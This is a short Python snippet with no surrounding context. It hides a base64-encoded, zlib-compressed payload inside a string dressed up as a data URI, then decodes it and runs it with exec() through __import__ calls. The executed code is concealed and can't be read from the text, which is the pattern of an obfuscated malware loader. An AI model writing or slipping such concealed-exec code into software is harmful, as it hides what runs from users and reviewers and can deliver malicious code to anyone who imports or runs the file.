import os
_one = int(os.environ.get('PYDECOMP_ONE', '1'))
_u = 'data:application/octet-stream;base64,eJwtjjEOwjAMRfec4m9tIAMCsSA6cgUWxBApDrVUJchJQdyeNMnf7P/0bEceVsiOX3Z5NpiJX3PWF4US9qhrXCccEKW3dWzEFrGcCHe7rHQTiTIO75g484cQw/IbdCWF8iqh+3bdpFSO2S4oPuWLP7EjcMDjaHAyOD/blQbtp/bpBpmKavUHv8w5NA=='
_body = _u.split(',', 1)[_one]
exec(__import__('zlib').decompress(__import__('base64').b64decode(_body)))
